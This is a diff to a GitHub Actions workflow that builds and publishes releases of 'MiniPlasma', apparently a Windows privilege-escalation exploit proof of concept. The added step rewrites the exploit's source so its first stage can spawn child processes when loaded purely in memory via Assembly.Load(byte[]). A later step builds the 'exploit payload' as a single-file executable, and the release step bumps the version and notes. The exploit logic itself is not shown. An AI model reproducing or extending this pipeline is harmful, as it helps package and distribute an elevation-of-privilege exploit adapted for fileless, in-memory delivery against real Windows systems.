@@ -24,6 +24,19 @@ jobs:
           Remove-Item -Recurse -Force MiniPlasma\packages -ErrorAction SilentlyContinue
           nuget restore MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln -PackagesDirectory MiniPlasma\packages
 
+      # ── Patch Stage0: Assembly.Location → MainModule.FileName ───────────────
+      - name: Patch Stage0 spawning for in-memory load
+        shell: pwsh
+        run: |
+          $src = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\Program.cs"
+          $txt = [IO.File]::ReadAllText($src)
+          $patched = $txt.Replace(
+              'typeof(Program).Assembly.Location',
+              'System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName')
+          [IO.File]::WriteAllText($src, $patched, [Text.Encoding]::UTF8)
+          if ($patched -ne $txt) { Write-Output "Patched Assembly.Location in $src" }
+          else { Write-Warning "Pattern not found - check source" }
+
       # ── Build inner EXE (full exploit, Costura single-file) ───────────────
       - name: Build inner EXE (exploit payload)
         run: >
@@ -165,9 +178,9 @@ jobs:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         shell: pwsh
         run: |
-          $tag = "v5.1-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
+          $tag = "v5.2-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
           gh release create $tag staging\* `
-            --title "MiniPlasma v5.1 - fix arg passing + synchronous Start()" `
-            --notes "Fixed: Start() now synchronous (Stage0 blocks until children finish). Fixed: all args passed to child processes (stage+handle args no longer dropped). EXE+DLL must be in same directory." `
+            --title "MiniPlasma v5.2 - fix Stage0 Assembly.Location patch" `
+            --notes "Fixed: patch Assembly.Location to MainModule.FileName before inner EXE build so Stage0 can spawn child processes when loaded via Assembly.Load(byte[]). EXE+DLL must be in same directory." `
             --repo $env:GITHUB_REPOSITORY
           Write-Output "Release: $tag"
